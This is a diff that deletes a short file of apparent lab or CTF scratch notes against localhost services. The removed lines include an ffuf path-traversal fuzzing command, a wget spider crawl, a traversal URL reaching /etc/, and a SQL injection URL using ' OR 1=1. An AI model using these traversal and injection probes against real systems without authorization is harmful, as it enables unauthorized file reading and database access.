@@ -1,7 +1,0 @@
-ffuf -u 'http://localhost:8081/view.php?file=../../FUZZ' -w /usr/share/dict/words -mc all
-
-wget -r -l 15 --spider --no-check-certificate http://localhost:8081/vault/  
-
-http://localhost:8081/view.php?file=../../../etc/
-
-http://localhost:8080/api/v1/search?pid=%27%20OR%201=1%20
